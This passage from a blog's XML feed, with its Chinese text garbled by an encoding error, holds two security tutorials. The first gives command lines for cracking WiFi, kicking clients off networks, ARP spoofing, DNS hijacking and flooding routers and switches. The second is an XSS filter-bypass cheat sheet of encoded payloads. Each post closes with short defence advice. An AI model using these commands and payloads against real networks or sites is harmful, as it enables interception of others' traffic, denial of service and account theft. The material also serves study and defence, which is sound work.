title="kaliè‡ªåŠ¨åŒ–å·¥å…·wifite"></a>kaliè‡ªåŠ¨åŒ–å·¥å…·wifite</h3>åŸç†ï¼šå°±æ˜¯ä¸Šé¢çš„å‘½ä»¤åªä¸è¿‡æ˜¯è‡ªåŠ¨åŒ–äº†<br>ä½¿ç”¨ï¼šcmdè¾“å…¥wifiteè¿›å…¥æ‰«æ<br><img src="https://Lmg66.github.io/img/161.png" alt="å›¾ç‰‡"><br>è§‰å¾—æ‰«æå¥½äº†ctrl+cå°±å¥½ï¼ŒæŒ‰ç…§åºå·é€‰æ‹©è¦ç ´è§£çš„wifiå³å¯ï¼Œæ ¹æ®wifiå¼€å¯äº†å•¥ä¼šè¿›è¡Œè‡ªåŠ¨çš„ç ´è§£ï¼Œå¦‚æœæƒ³è·³è¿‡æŸä¸ªç ´è§£æ–¹å¼æŒ‰ctrl+cå³å¯ï¼Œå¦‚æœè·å–åˆ°æ¡æ‰‹åŒ…è‡ªå¸¦çš„å¯†ç å­—å…¸æ²¡è·‘å‡ºæ¥ï¼Œå¯ä»¥å»ä¸Šé¢æé†’çš„è·¯å¾„æ‰¾æ¡æ‰‹åŒ…ï¼Œç”¨è‡ªå·±çš„å­—å…¸è·‘<br><img src="https://Lmg66.github.io/img/162.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/163.png" alt="å›¾ç‰‡"><h3 id="çªç ´é™åˆ¶"><a href="#çªç ´é™åˆ¶" class="headerlink" title="çªç ´é™åˆ¶"></a>çªç ´é™åˆ¶</h3><h4 id="macåœ°å€é™åˆ¶"><a href="#macåœ°å€é™åˆ¶" class="headerlink" title="macåœ°å€é™åˆ¶"></a>macåœ°å€é™åˆ¶</h4>æ‰«ææŸ¥çœ‹å·²è¿æ¥çš„å®¢æˆ·æœºçš„macåœ°å€å°†ç½‘å¡çš„macåœ°å€æ”¹ä¸ºå…¶å³å¯<br>å…ˆdownæ‰ç½‘å¡<br>ifconfig wlan0 down<br>ä¿®æ”¹macåœ°å€<br>macchanger wlan0 -m [éœ€è¦ä¿®æ”¹çš„macåœ°å€ï¼Œæœ‰äº›ç½‘å¡å¯èƒ½ä¸æ”¯æŒä¿®æ”¹]<br>å¯åŠ¨ç½‘å¡<br>ifconfig wlan0 up<h4 id="æœªå¹¿æ’­ssidçš„wifi"><a href="#æœªå¹¿æ’­ssidçš„wifi" class="headerlink" title="æœªå¹¿æ’­ssidçš„wifi"></a>æœªå¹¿æ’­ssidçš„wifi</h4></li></ul><p>1.ç­‰å¾…å…¶ä»–ç”¨æˆ·è¿æ¥ï¼Œä¼šå…ˆè¯¢é—®ssid<br>airodump-ng wlan0mon å°±èƒ½çœ‹è§<br>2.å°†åˆ«äººè¸¢ä¸‹çº¿ï¼Œè®©å…¶é‡è¿ï¼Œå’ŒæŠ“èµ·æ¡æ‰‹åŒ…ä¸€æ ·ï¼Œæ³¨æ„ä¿¡é“<br>aireplay-ng -0 5 -a [è·¯ç”±bssid] -c [å®¢æˆ·ç«¯STATION]</p><h2 id="è¿æ¥wifiåçš„åˆ©ç”¨-å†…ç½‘æ¸—é€"><a href="#è¿æ¥wifiåçš„åˆ©ç”¨-å†…ç½‘æ¸—é€" class="headerlink" title="è¿æ¥wifiåçš„åˆ©ç”¨(å†…ç½‘æ¸—é€)"></a>è¿æ¥wifiåçš„åˆ©ç”¨(å†…ç½‘æ¸—é€)</h2><h3 id="ARPæ¬ºéª—"><a href="#ARPæ¬ºéª—" class="headerlink" title="ARPæ¬ºéª—"></a>ARPæ¬ºéª—</h3><p>æŸ¥çœ‹å†…ç½‘çš„ä¸»æœº<br>nmap -sP 192.168.1.0/24 -v<br><img src="https://Lmg66.github.io/img/164.png" alt="å›¾ç‰‡"><br>å¼€å¯è½¬å‘æ¨¡å¼</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><p>åŒå‘æ¬ºéª—åˆ†åˆ«æ˜¯ç›®æ ‡ä¸»æœºipå’Œç½‘å…³<br>arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.106<br>arpspoof -i eth0 -t 192.168.1.106 -r 192.168.1.1<br><img src="https://Lmg66.github.io/img/165.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/166.png" alt="å›¾ç‰‡"><br>å¯åŠ¨wireshareæŸ¥çœ‹ip.src == 192.168.1.106ï¼Œå‘ç°æ¬ºéª—æˆåŠŸå¯ä»¥æ‹¦æˆªä»–çš„è®¿é—®<br><img src="https://Lmg66.github.io/img/167.png" alt="å›¾ç‰‡"><br>driftnet -i eth0 ç›‘å¬å›¾ç‰‡<br><img src="https://Lmg66.github.io/img/168.png" alt="å›¾ç‰‡"></p><h3 id="æ¯’åŒ–å†…ç½‘ç”¨æˆ·æ— æ³•ä¸Šç½‘"><a href="#æ¯’åŒ–å†…ç½‘ç”¨æˆ·æ— æ³•ä¸Šç½‘" class="headerlink" title="æ¯’åŒ–å†…ç½‘ç”¨æˆ·æ— æ³•ä¸Šç½‘"></a>æ¯’åŒ–å†…ç½‘ç”¨æˆ·æ— æ³•ä¸Šç½‘</h3><p>åŸç†:è¿›è¡Œarpæ¬ºéª—ä½†ä¸è¿›è¡Œè½¬å‘<br>echo 0 &gt; /proc/sys/net/ipv4/ip_forward<br>åŒå‘æ¬ºéª—<br>arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.106<br>arpspoof -i eth0 -t 192.168.1.106 -r 192.168.1.1</p><h3 id="dnsåŠ«æŒ"><a href="#dnsåŠ«æŒ" class="headerlink" title="dnsåŠ«æŒ"></a>dnsåŠ«æŒ</h3><p>ç›®æ ‡ä¸»æœºwindow7   ipåœ°å€ 192.168.124.128<br>æ”»å‡»æœºkali              ipåœ°å€ 192.168.124.139<br>åŠ«æŒåˆ°webæœåŠ¡window10(phpstudy) ipåœ°å€ 192.168.1.104<br>ä¿®æ”¹é…ç½®æ–‡ä»¶nano /etc/ettercap/etter.dns<br><img src="https://Lmg66.github.io/img/169.png" alt="å›¾ç‰‡"><br>ettercap -Tq -i eth0 -P dns_spoof /// ///<br>è¿›è¡Œæ¬ºéª—-iåæ˜¯æ— çº¿ç½‘å¡ ///ä¸­åŠ ç›®æ ‡ä¸»æœºå’Œç½‘å¡ï¼Œä¸åŠ å°±æ˜¯å…¨éƒ¨ï¼Œå‘ç°window7è¢«åŠ«æŒæˆåŠŸï¼Œå¦‚æœå®‰è£…æ€æ¯’è½¯ä»¶å¯èƒ½åŠ«æŒä¸äº†<br><img src="https://Lmg66.github.io/img/170.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/171.png" alt="å›¾ç‰‡"><br>å¦‚ä½•æ¢å¤</p><pre><code>ipconfig/flushdnsåˆ·æ–°å³å¯</code></pre><p><img src="https://Lmg66.github.io/img/172.png" alt="å›¾ç‰‡"></p><h3 id="macåœ°å€è¡¨æ³›çº¢"><a href="#macåœ°å€è¡¨æ³›çº¢" class="headerlink" title="macåœ°å€è¡¨æ³›çº¢"></a>macåœ°å€è¡¨æ³›çº¢</h3><p>äº¤æ¢æœºä¸­æœ‰macåœ°å€è¡¨è®°å½•è¿æ¥çš„pcï¼Œæ”»å‡»è€…ä¸æ–­åˆ·æ–°macåœ°å€æ¥å¡«æ»¡äº¤æ¢æœºçš„macåœ°å€è¡¨ï¼Œäº¤æ¢æœºåœ¨macåœ°å€è¡¨æ‰¾ä¸åˆ°è¯¥ç”¨æˆ·åªèƒ½é€šè¿‡å¹¿æ’­çš„å½¢å¼å‘é€ï¼Œæ”»å‡»è€…å°±å¯ä»¥æˆªè·æ•°æ®<br>äº¤æ¢æœºè®¾ç½®é™æ€macåœ°å€ç»‘å®šå¯é¢„é˜²ï¼Œéè¡¨å†…è¯·æ±‚å°†å…¨éƒ¨ä¸¢å¼ƒ</p><pre><code>macof -i eth0</code></pre><h3 id="dhcpåœ°å€è€—å°½æ”»å‡»"><a href="#dhcpåœ°å€è€—å°½æ”»å‡»" class="headerlink" title="dhcpåœ°å€è€—å°½æ”»å‡»"></a>dhcpåœ°å€è€—å°½æ”»å‡»</h3><p>è·¯ç”±å™¨åˆ†é…ipï¼Œæ”»å‡»è€…å‘é€å¤§é‡discoveråŒ…æ¥è·å–ipè®©å…¶è€…æ— ipä½¿ç”¨ï¼Œæ— æ³•è¿æ¥<br>å…ˆå®‰è£…<br>apt-get install yersinia<br>å¯åŠ¨<br>yersinia -G<br><img src="https://Lmg66.github.io/img/173.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/174.png" alt="å›¾ç‰‡"></p><h2 id="å¹²æ‰°é€šè®¯"><a href="#å¹²æ‰°é€šè®¯" class="headerlink" title="å¹²æ‰°é€šè®¯"></a>å¹²æ‰°é€šè®¯</h2><p>ä»¥ä¸‹åˆ©ç”¨å‰ææ— çº¿ç½‘å¡è¦å¼€å¯ç›‘å¬æ¨¡å¼</p><h3 id="åˆ›å»ºæ¶æ„çš„æ— çº¿çƒ­ç‚¹"><a href="#åˆ›å»ºæ¶æ„çš„æ— çº¿çƒ­ç‚¹" class="headerlink" title="åˆ›å»ºæ¶æ„çš„æ— çº¿çƒ­ç‚¹"></a>åˆ›å»ºæ¶æ„çš„æ— çº¿çƒ­ç‚¹</h3><p>å·¥å…·mdk3 mdk3å¯æŸ¥çœ‹ä½¿ç”¨è¯´æ˜</p><pre><code>mdk3 wlan0mon b -n SSID (-f å¯ä»¥å¯¼å…¥åˆ—è¡¨åˆ›å»ºå¤šä¸ªssidwifiï¼Œä¸æŒ‡å®šåˆ™éšæœº) -c [ä¿¡é“] -w -g -s 100</code></pre><h3 id="éªŒè¯æ´ªæ°´æ”»å‡»-æ”»å‡»è·¯ç”±å™¨"><a href="#éªŒè¯æ´ªæ°´æ”»å‡»-æ”»å‡»è·¯ç”±å™¨" class="headerlink" title="éªŒè¯æ´ªæ°´æ”»å‡»(æ”»å‡»è·¯ç”±å™¨)"></a>éªŒè¯æ´ªæ°´æ”»å‡»(æ”»å‡»è·¯ç”±å™¨)</h3><p>ä¼ªé€ å¤§é‡çš„clientå»è¿æ¥ap,å¯å¯¼è‡´æ­£åœ¨å·²è¿æ¥ç”¨æˆ·æ— ååº” -aååŠ äº¤æ¢æœºssid</p><pre><code>mdk3 wlan0mon a -a FC:D7:33:DE:F3:8A -c  -s 300</code></pre><h3 id="å¼ºåˆ¶è§£é™¤éªŒè¯æ´ªæ°´æ”»å‡»æ–¹å¼-é’ˆå¯¹å®¢æˆ·æœºä½¿å…¶ä¸‹çº¿ï¼Œé€šè¿‡æ¨¡ä»¿ç®¡ç†é’ˆ"><a href="#å¼ºåˆ¶è§£é™¤éªŒè¯æ´ªæ°´æ”»å‡»æ–¹å¼-é’ˆå¯¹å®¢æˆ·æœºä½¿å…¶ä¸‹çº¿ï¼Œé€šè¿‡æ¨¡ä»¿ç®¡ç†é’ˆ" class="headerlink" title="å¼ºåˆ¶è§£é™¤éªŒè¯æ´ªæ°´æ”»å‡»æ–¹å¼(é’ˆå¯¹å®¢æˆ·æœºä½¿å…¶ä¸‹çº¿ï¼Œé€šè¿‡æ¨¡ä»¿ç®¡ç†é’ˆ)"></a>å¼ºåˆ¶è§£é™¤éªŒè¯æ´ªæ°´æ”»å‡»æ–¹å¼(é’ˆå¯¹å®¢æˆ·æœºä½¿å…¶ä¸‹çº¿ï¼Œé€šè¿‡æ¨¡ä»¿ç®¡ç†é’ˆ)</h3><p>å°±æ˜¯ä¹‹å‰æŠ“æ¡æ‰‹åŒ…ä¸€æ ·å°†åˆ«äººè¸¢ä¸‹çº¿</p><pre><code>aireplay-ng -0 5 -a [è·¯ç”±bssid] -c [å®¢æˆ·ç«¯STATION] wlan0mon</code></pre><p>ç”¨mdk3é’ˆå¯¹å…¨ç½‘ï¼Œåœ¨æ”»å‡»ä¸­è¸¢æ‰çº¿åä¹Ÿæ— æ³•è¿æ¥æˆåŠŸ</p><pre><code>mdk3 wlan0mon d</code></pre><p>å¯-b åŠ æ–‡ä»¶æŒ‡å®šmacåœ°å€æ”»å‡»</p><h2 id="å¦‚ä½•è®¾ç½®è·¯ç”±å™¨æ›´å®‰å…¨"><a href="#å¦‚ä½•è®¾ç½®è·¯ç”±å™¨æ›´å®‰å…¨" class="headerlink" title="å¦‚ä½•è®¾ç½®è·¯ç”±å™¨æ›´å®‰å…¨"></a>å¦‚ä½•è®¾ç½®è·¯ç”±å™¨æ›´å®‰å…¨</h2><p>æ”»ä¸é˜²å¾¡æœ¬èº«å°±æ˜¯ä¸€åœºåšå¼ˆæ ¹æ®ä¸Šé¢çš„æ”»å‡»æ–¹å¼æˆ‘ä»¬å¯ä»¥è®¾ç½®è·¯ç”±å™¨æ˜¯wifiæ›´å®‰å…¨å°¤å…¶æ˜¯ç‰©è”ç½‘çš„å‘å±•ï¼Œå®¶é‡Œçš„å¾ˆå¤šä¸œè¥¿éƒ½è¦è¿æ¥ç½‘ç»œ</p><ol><li>wifiåŠ å¯†æ–¹å¼é‡‡ç”¨wpaåŠ å¯†ï¼Œä¸ç”¨é‡‡ç”¨wpeåŠ å¯†ï¼Œå¦‚æœä¸æ‡‚wpsï¼Œä¹Ÿä¸è¦å¼€å¯wpsåŠŸèƒ½</li><li>wifiå¯†ç è¦ä¸è¦ä½¿ç”¨å¼±å£ä»¤</li><li>å¯¹äºå¸¸ç”¨è®¾å¤‡å¯ä»¥è¿›è¡Œipå’Œmacçš„ç»‘å®š</li><li>å¦‚æœæ²¡æœ‰ç”¨æˆ·ä¹‹é—´ç›¸äº’è®¿é—®çš„éœ€æ±‚å¯ä»¥å¼€å¯apéš”ç¦»</li><li>å¯ä»¥è®¾ç½®è®¿å®¢wifiï¼Œé˜²æ­¢å¯†ç è¢«æ³„éœ²</li><li>å°±æ˜¯é€‰ç”¨ä¸€äº›æ¯”è¾ƒå¥½çš„è·¯ç”±å™¨ï¼Œé˜²æ­¢è·¯ç”±å™¨æœ¬èº«å­˜åœ¨æ¼æ´ï¼Œè·¯ç”±å™¨é¡µé¢å°±æ˜¯webé¡µé¢å¯èƒ½å­˜åœ¨æ¼æ´</li><li>å°½é‡å°‘ä½¿ç”¨wifiä¸‡èƒ½é’¥åŒ™ï¼Œè…¾è®¯wifiç®¡å®¶ç­‰ï¼Œæˆ–è€…ä½¿ç”¨æ—¶æ‰¾åˆ°é‡Œé¢çš„è®¾ç½®ä¸å…±äº«è‡ªå·±çš„wifiå¯†ç <h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2>bç«™ï¼š<a href="https://www.bilibili.com/video/BV1e7411o7GB?p=1" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1e7411o7GB?p=1</a><br>bç«™ï¼š<a href="https://www.bilibili.com/video/BV14z4y1Q7Nb?from=search&seid=10037556429710890008" target="_blank" rel="noopener">https://www.bilibili.com/video/BV14z4y1Q7Nb?from=search&amp;seid=10037556429710890008</a><br>è®ºå›ï¼š<a href="https://www.anywlan.com/" target="_blank" rel="noopener">https://www.anywlan.com/</a><br>ç­‰ç­‰ç­‰å¾ˆå¤šå‰è¾ˆçš„æ–‡ç« ï¼Œæ²¡æ³•éƒ½åˆ—ä¸¾(æ‰¾ä¸åˆ°äº†)ï¼Œè¡¨ç¤ºæŠ±æ­‰å’Œæ„Ÿè°¢</li></ol>]]></content>
      
      
      <categories>
          
          <category> æ— çº¿å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wifiæ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xssåŸç†ç»•è¿‡é˜²å¾¡ä¸ªäººæ€»ç»“</title>
      <link href="/posts/a100.html"/>
      <url>/posts/a100.html</url>
      
        <content type="html"><![CDATA[<h2 id="xssåŸç†"><a href="#xssåŸç†" class="headerlink" title="xssåŸç†"></a>xssåŸç†</h2><p>xssäº§ç”Ÿçš„åŸå› æ˜¯å°†æ¶æ„çš„htmlè„šæœ¬ä»£ç æ’å…¥webé¡µé¢ï¼Œåº•å±‚åŸç†å’Œsqlæ³¨å…¥ä¸€æ ·ï¼Œéƒ½æ˜¯å› ä¸ºjså’Œphpç­‰éƒ½æ˜¯è§£é‡Šæ€§è¯­è¨€ï¼Œä¼šå°†è¾“å…¥çš„å½“åšå‘½ä»¤æ‰§è¡Œ,æ‰€ä»¥å¯ä»¥æ³¨å…¥æ¶æ„ä»£ç æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å†…å®¹</p><h2 id="xssåˆ†ç±»"><a href="#xssåˆ†ç±»" class="headerlink" title="xssåˆ†ç±»"></a>xssåˆ†ç±»</h2><ul><li>å­˜å‚¨å‹xss:<br>jsè„šæœ¬ä»£ç ä¼šæ’å…¥æ•°æ®åº“ï¼Œå…·æœ‰ä¸€å®šçš„æŒä¹…æ€§</li><li>åå°„å‹xss:<br>jsç»è¿‡åç«¯phpç­‰è¯­è¨€å¤„ç†</li><li>domå‹xss:<br>å’Œåå°„å‹xssç±»ä¼¼ï¼Œä½†æ˜¯ä¸ç»è¿‡åç«¯æœåŠ¡å™¨çš„å¤„ç†<h2 id="xssç»•è¿‡æ€»ç»“"><a href="#xssç»•è¿‡æ€»ç»“" class="headerlink" title="xssç»•è¿‡æ€»ç»“:"></a>xssç»•è¿‡æ€»ç»“:</h2><h3 id="è‡ªèº«ç»•è¿‡"><a href="#è‡ªèº«ç»•è¿‡" class="headerlink" title="è‡ªèº«ç»•è¿‡"></a>è‡ªèº«ç»•è¿‡</h3><pre><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;  //æ²¡æœ‰è¿‡æ»¤&lt;Script&gt;alert(&#39;xss&#39;)&lt;/Script&gt; //å¤§å°å†™ç»•è¿‡&lt;scscriptript&gt;alert(&#39;xss&#39;)&lt;/scscriptript&gt; //åµŒå¥—ç»•è¿‡&lt;sc\x00ript&gt;alert(&#39;xss&#39;)&lt;/sc\x00ript&gt; //ç©ºå­—èŠ‚ç»•è¿‡&quot; oonnclick=alert(&#39;XSS&#39;) //           //é—­åˆå•åŒå¼•å·ç»•è¿‡(å¯¹äºhtmlå®ä½“è¾“å…¥çš„å’Œè¿‡æ»¤&lt; &gt;)</code></pre></li></ul><h3 id="å…¶ä»–æ ‡ç­¾ç»•è¿‡"><a href="#å…¶ä»–æ ‡ç­¾ç»•è¿‡" class="headerlink" title="å…¶ä»–æ ‡ç­¾ç»•è¿‡"></a>å…¶ä»–æ ‡ç­¾ç»•è¿‡</h3><pre><code>&lt;a herf=&quot;javascript:alert(1)&quot;&gt;show&lt;/a&gt; &lt;body onload=alert(1)&gt;&lt;input type=image src=x:x onerror=alert(1)&gt;&lt;isindex onmouseover=&quot;alert(1)&quot; &gt;&lt;form oninput=alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;textarea autofocus onfocus=alert(1)&gt;&lt;input oncut=alert(1)&gt;&lt;svg onload=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;&lt;marquee onstart=alert(1)&gt;</code></pre><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><h4 id="base64ç¼–ç ç»•è¿‡"><a href="#base64ç¼–ç ç»•è¿‡" class="headerlink" title="base64ç¼–ç ç»•è¿‡"></a>base64ç¼–ç ç»•è¿‡</h4><pre><code>&lt;a herf=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;show&lt;/a&gt;&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;               </code></pre><h4 id="Unicodeç¼–ç ç»•è¿‡"><a href="#Unicodeç¼–ç ç»•è¿‡" class="headerlink" title="Unicodeç¼–ç ç»•è¿‡"></a>Unicodeç¼–ç ç»•è¿‡</h4><p>åœ¨çº¿ç¼–ç åœ°å€:<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/unicode.aspx</a></p><pre><code>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;&lt;script&gt;\u0061lert(1)&lt;/script&gt;&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</code></pre><p><img src="https://Lmg66.github.io/img/146.png" alt="å›¾ç‰‡"></p><h4 id="urlç¼–ç ç»•è¿‡"><a href="#urlç¼–ç ç»•è¿‡" class="headerlink" title="urlç¼–ç ç»•è¿‡"></a>urlç¼–ç ç»•è¿‡</h4><pre><code>&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;</code></pre><h4 id="Asciiç ç»•è¿‡"><a href="#Asciiç ç»•è¿‡" class="headerlink" title="Asciiç ç»•è¿‡"></a>Asciiç ç»•è¿‡</h4><pre><code>&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&lt;/script&gt;</code></pre><p>å¯ä½¿ç”¨æµè§ˆå™¨æ’ä»¶å¿«é€Ÿç¼–ç <br><img src="https://Lmg66.github.io/img/147.png" alt="å›¾ç‰‡"></p><h4 id="hexç»•è¿‡"><a href="#hexç»•è¿‡" class="headerlink" title="hexç»•è¿‡"></a>hexç»•è¿‡</h4><pre><code>&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;</code></pre><h4 id="åè¿›åˆ¶ï¼Œå…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶"><a href="#åè¿›åˆ¶ï¼Œå…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶" class="headerlink" title="åè¿›åˆ¶ï¼Œå…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶"></a>åè¿›åˆ¶ï¼Œå…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶</h4><pre><code>&lt;img src=x onerror=&quot;\u0061lert(1)&quot;/&gt;&lt;img src=x onerror=&quot;eval(&#39;\141lert(1)&#39;)&quot;/&gt;&lt;img src=x onerror=&quot;eval(&#39;\x61lert(1)&#39;)&quot;/&gt;&lt;img src=x onerror=â€&amp;#x0061;lert(1)â€/&gt;&lt;img src=x onerror=â€&amp;#97;lert(1)â€/&gt;&lt;img src=x onerror=â€eval(â€˜\a\l\ert(1)â€˜)â€/&gt;</code></pre><h3 id="è¡¥å……-onäº‹ä»¶"><a href="#è¡¥å……-onäº‹ä»¶" class="headerlink" title="è¡¥å……:onäº‹ä»¶"></a>è¡¥å……:onäº‹ä»¶</h3><pre><code>onsearchonwebkitanimationendonwebkitanimationiterationonwebkitanimationstartonwebkittransitionendonabortonbluroncanceloncanplayoncanplaythroughonchangeonclickoncloseoncontextmenuoncuechangeondblclickondragondragendondragenterondragleaveondragoverondragstartondropondurationchangeonemptiedonendedonerroronfocusonformdataoninputoninvalidonkeydownonkeypressonkeyuponloadonloadeddataonloadedmetadataonloadstartonmousedownonmouseenteronmouseleaveonmousemoveonmouseoutonmouseoveronmouseuponmousewheelonpauseonplayonplayingonprogressonratechangeonresetonresizeonscrollonseekedonseekingonselectonstalledonsubmitonsuspendontimeupdateontoggleonvolumechangeonwaitingonwheelonauxclickongotpointercaptureonlostpointercaptureonpointerdownonpointermoveonpointeruponpointercancelonpointeroveronpointeroutonpointerenteronpointerleaveonselectstartonselectionchangeonanimationendonanimationiterationonanimationstartontransitionendonafterprintonbeforeprintonbeforeunloadonhashchangeonlanguagechangeonmessageonmessageerroronofflineononlineonpagehideonpageshowonpopstateonrejectionhandledonstorageonunhandledrejectiononunload</code></pre><h3 id="é•¿åº¦é™åˆ¶çš„ç»•è¿‡"><a href="#é•¿åº¦é™åˆ¶çš„ç»•è¿‡" class="headerlink" title="é•¿åº¦é™åˆ¶çš„ç»•è¿‡:"></a>é•¿åº¦é™åˆ¶çš„ç»•è¿‡:</h3><h4 id="å¯ä»¥åˆ©ç”¨äº‹ä»¶å¦‚"><a href="#å¯ä»¥åˆ©ç”¨äº‹ä»¶å¦‚" class="headerlink" title="å¯ä»¥åˆ©ç”¨äº‹ä»¶å¦‚:"></a>å¯ä»¥åˆ©ç”¨äº‹ä»¶å¦‚:</h4><pre><code>&quot;onclick=alert(1)// æ¥å‡å°‘å­—æ•°</code></pre><h4 id="å°†ä»£ç è—å…¥location-hashä¸­ï¼Œæ„é€ ä¸º"><a href="#å°†ä»£ç è—å…¥location-hashä¸­ï¼Œæ„é€ ä¸º" class="headerlink" title="å°†ä»£ç è—å…¥location.hashä¸­ï¼Œæ„é€ ä¸º"></a>å°†ä»£ç è—å…¥location.hashä¸­ï¼Œæ„é€ ä¸º</h4><pre><code>&quot;onclick=&quot;eval(location.hash.sustr(1))</code></pre><h4 id="æ³¨é‡Šå°†ä¸¤ä¸ªæ–‡æœ¬æ¡†å˜ä¸ºä¸€ä¸ª"><a href="#æ³¨é‡Šå°†ä¸¤ä¸ªæ–‡æœ¬æ¡†å˜ä¸ºä¸€ä¸ª" class="headerlink" title="æ³¨é‡Šå°†ä¸¤ä¸ªæ–‡æœ¬æ¡†å˜ä¸ºä¸€ä¸ª"></a>æ³¨é‡Šå°†ä¸¤ä¸ªæ–‡æœ¬æ¡†å˜ä¸ºä¸€ä¸ª</h4><h4 id="å¥‡æ€ªçš„ç¬¦å·è§£æ"><a href="#å¥‡æ€ªçš„ç¬¦å·è§£æ" class="headerlink" title="å¥‡æ€ªçš„ç¬¦å·è§£æ"></a>å¥‡æ€ªçš„ç¬¦å·è§£æ</h4><pre><code>&lt;svg/onload=alert()&gt;&lt;script/src=//â‘­.â‚¨&gt;</code></pre><p>å‚è€ƒæ–‡ç« :<a href="https://nosec.org/home/detail/3206.html" target="_blank" rel="noopener">https://nosec.org/home/detail/3206.html</a></p><h2 id="xssé˜²å¾¡"><a href="#xssé˜²å¾¡" class="headerlink" title="xssé˜²å¾¡"></a>xssé˜²å¾¡</h2><ol><li>è®¾ç½®cookieä¸­è®¾ç½®httponlyå±æ€§ï¼Œé‚£ä¹ˆjsè„šæœ¬å°†æ— æ³•è¯»å–åˆ°cookieä¿¡æ¯<br>PHP5(PHP5.2ä»¥ä¸Šç‰ˆæœ¬å·²æ”¯æŒHttpOnlyå‚æ•°çš„è®¾ç½®ï¼ŒåŒæ ·ä¹Ÿæ”¯æŒå…¨å±€çš„HttpOnlyçš„è®¾ç½®ï¼Œåœ¨php.iniä¸­è®¾ç½®ï¼Œè®¾ç½®å…¶å€¼ä¸º1æˆ–è€…TRUEï¼Œæ¥å¼€å¯å…¨å±€çš„Cookieçš„HttpOnlyå±æ€§)<br>session.cookie_httponly =<br>å½“ç„¶ä»£ç ä¹Ÿèƒ½å®ç°ï¼š<br>ini_set(â€œsession.cookie_httponlyâ€, 1);<br>session_set_cookie_params(0, NULL, NULL, NULL, TRUE);</li><li>é™åˆ¶è¾“å…¥é•¿åº¦ï¼Œåœ¨ä¸šåŠ¡å†…å‡å°‘ç”¨æˆ·èƒ½è¾“å…¥é•¿åº¦ï¼Œåƒå¹´é¾„ï¼Œç”¨æˆ·åç­‰åœ°æ–¹é™åˆ¶15ä¸ªå­—ç¬¦ï¼Œå‡ ä¹å°±å¾ˆéš¾xssï¼ˆä¸ªäººç†è§£ï¼‰</li><li>è¿‡æ»¤ä¸šåŠ¡ç”¨ä¸åˆ°çš„å­—ç¬¦å¦‚&lt; &gt;ï¼Œscriptç­‰æ ‡ç­¾å­—ç¬¦</li><li>è¾“å‡ºæ£€æŸ¥ï¼Œè¾“å‡ºåˆ°urlçš„è¿›è¡ŒURLEncodeï¼Œè¾“å‡ºè¿›è¡Œhtmlå®ä½“åŒ–è¾“å‡º</li><li>æˆç†Ÿæ¡†æ¶ç›¸å¯¹å®‰å…¨äº›ï¼ˆæ³¨æ„æ˜¯ç›¸å¯¹ï¼‰<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2>æ·±å…¥ç†è§£æµè§ˆå™¨è§£ææœºåˆ¶å’ŒXSSå‘é‡ç¼–ç ï¼š<a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a><br>XSSè¿‡æ»¤ç»•è¿‡é€ŸæŸ¥è¡¨ï¼š<a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/153055.html</a><br>ã€Šç™½å¸½å­è®²webå®‰å…¨ã€‹</li></ol>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xssåˆ©ç”¨</title>
      <link href="/posts/b0f.html"/>
      <url>/posts/b0f.html</url>
      
